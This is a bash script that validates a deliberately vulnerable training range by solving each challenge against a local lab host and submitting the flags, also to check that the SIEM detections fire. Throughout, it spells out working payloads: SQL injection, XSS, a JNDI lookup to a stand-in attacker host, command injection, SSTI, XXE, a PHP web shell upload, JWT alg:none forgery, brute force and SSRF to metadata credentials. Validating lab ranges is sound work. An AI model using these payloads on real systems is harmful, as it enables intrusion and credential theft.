#!/usr/bin/env bash
# Solves every challenge on the range end to end, submits each flag to the
# scoreboard and reports pass/fail. Use it to verify a deployment and to confirm
# that the SIEM detection use cases fire.
#
#   ./tools/validate_range.sh http://127.0.0.1:5005
set -uo pipefail

BASE="${1:-http://127.0.0.1:5005}"
APP_ROOT="${APP_ROOT:-/app}"          # container path used by file-read payloads
TEAM="${TEAM:-validation-bot}"
PYTHON="${PYTHON:-python3}"   # must be an interpreter that has Flask installed
JAR="$(mktemp -d)/cookies.txt"
PASS=0; FAIL=0; declare -a FAILED=()

c()  { curl -s -b "$JAR" -c "$JAR" -H "X-Lab-Test-ID: validate" "$@"; }
cj() { c -H 'Content-Type: application/json' "$@"; }

grab() { grep -o 'HELPAG{[^}]*}' | head -1; }

submit() {  # submit <challenge-id> <flag>
  local id="$1" flag="${2:-}"
  if [[ -z "$flag" ]]; then
    printf '  \033[31mFAIL\033[0m %-22s no flag recovered\n' "$id"; FAIL=$((FAIL+1)); FAILED+=("$id"); return
  fi
  local body; body=$(cj -X POST "$BASE/api/ctf/submit" -d "{\"flag\":\"$flag\"}")
  if grep -q '"correct":true' <<<"$body"; then
    printf '  \033[32mPASS\033[0m %-22s %s\n' "$id" "$flag"; PASS=$((PASS+1))
  else
    printf '  \033[31mFAIL\033[0m %-22s rejected: %s\n' "$id" "$body"; FAIL=$((FAIL+1)); FAILED+=("$id")
  fi
}

echo "== HELP AG VAPT range validation against $BASE =="
cj -X POST "$BASE/api/ctf/team" -d "{\"team\":\"$TEAM\"}" >/dev/null

echo "-- recon and misconfiguration --"
c "$BASE/robots.txt" >/dev/null
submit recon-robots       "$(c "$BASE/internal/engineering-notes.txt" | grab)"
submit misconfig-debug    "$(c "$BASE/api/debug/config" | grab)"
submit misconfig-dotenv   "$(c "$BASE/.env" | grab)"
c "$BASE/backups/" >/dev/null
submit misconfig-backups  "$(c "$BASE/backups/site-config.bak" | grab)"

echo "-- access control --"
submit access-idor        "$(c "$BASE/api/users/1337" | grab)"
submit access-massassign  "$(cj -X POST "$BASE/api/profile/update" \
                              -d '{"email":"a@lab.invalid","role":"admin"}' | grab)"

echo "-- injection --"
submit inject-sqli-union  "$(c -G "$BASE/api/products/search" \
                              --data-urlencode "q=' UNION SELECT id,label,value FROM flags-- " | grab)"
submit inject-sqli-auth   "$(cj -X POST "$BASE/api/legacy/login" \
                              -d '{"username":"admin'\''-- ","password":"x"}' | grab)"
submit xss-reflected      "$(c -G "$BASE/reflect" \
                              --data-urlencode 'name=<script>alert(1)</script>' | grab)"
cj -X POST "$BASE/guestbook" -d '{"author":"tester","message":"<script>fetch(\"/steal\")</script>"}' >/dev/null
submit xss-stored         "$(c "$BASE/admin/review" | grab)"
submit inject-jndi        "$(c -H 'X-Audit-Agent: ${jndi:ldap://attacker.lab.invalid/a}' \
                              "$BASE/api/legacy/audit" | grab)"

echo "-- file handling and code execution --"
submit file-traversal     "$(c -G "$BASE/api/documents/download" \
                              --data-urlencode 'file=../flagstore/traversal.flag' | grab)"
submit rce-cmdi           "$(c -G "$BASE/api/diagnostics/ping" \
                              --data-urlencode 'host=127.0.0.1; cat flagstore/cmdi.flag' | grab)"
submit rce-ssti           "$(c -G "$BASE/api/newsletter/preview" --data-urlencode \
   "template={{ cycler.__init__.__globals__.os.popen('cat flagstore/ssti.flag').read() }}" | grab)"
XXE_BODY='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file://'"$APP_ROOT"'/flagstore/xxe.flag">]><r>&x;</r>'
submit inject-xxe         "$(c -X POST "$BASE/api/suppliers/import" \
   -H 'Content-Type: application/xml' --data-binary "$XXE_BODY" | grab)"
printf '<?php system($_GET["cmd"]); ?>\n' > /tmp/shell.php
submit upload-unrestricted "$(c -X POST "$BASE/api/upload" -F 'file=@/tmp/shell.php' | grab)"

echo "-- authentication --"
for p in 123456 password letmein qwerty summer2024; do
  cj -X POST "$BASE/api/login" -d "{\"username\":\"svc_backup\",\"password\":\"$p\"}" > /tmp/login.json
done
submit auth-bruteforce    "$(grab < /tmp/login.json)"
TOKEN="$(printf '%s' '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=\n' | tr '/+' '_-')"
TOKEN="$TOKEN.$(printf '%s' '{"sub":"attacker","role":"admin"}' | base64 | tr -d '=\n' | tr '/+' '_-')."
submit auth-jwt-none      "$(c -H "Authorization: Bearer $TOKEN" "$BASE/api/admin/report" | grab)"
md5of() { if command -v md5sum >/dev/null; then printf '%s' "$1" | md5sum | cut -d' ' -f1;
          else printf '%s' "$1" | md5 -q; fi; }
RESET="$(md5of j.ellison)"
RESET_BODY='{"username":"j.ellison","token":"'"$RESET"'"}'
cj -X POST "$BASE/api/password-reset/request" -d '{"username":"j.ellison"}' >/dev/null
submit auth-reset-token   "$(cj -X POST "$BASE/api/password-reset/consume" -d "$RESET_BODY" | grab)"
FORGED="$("$PYTHON" tools/forge_session.py --secret "${LAB_SESSION_SECRET:-deliberately-weak-lab-secret}")"
submit auth-weak-secret   "$(curl -s -H "Cookie: session=$FORGED" "$BASE/admin/panel" | grab)"

echo "-- ssrf and business logic --"
submit ssrf-metadata      "$(c -G "$BASE/api/fetch" --data-urlencode \
   "url=${METADATA_URL:-http://metadata:8080}/latest/meta-data/iam/security-credentials/lab-instance-role" | grab)"
submit logic-negative     "$(cj -X POST "$BASE/api/checkout" \
                              -d '{"quantity":-5,"unit_price":900}' | grab)"

echo
echo "== $PASS passed, $FAIL failed =="
[[ $FAIL -eq 0 ]] || { printf 'failed: %s\n' "${FAILED[*]}"; exit 1; }
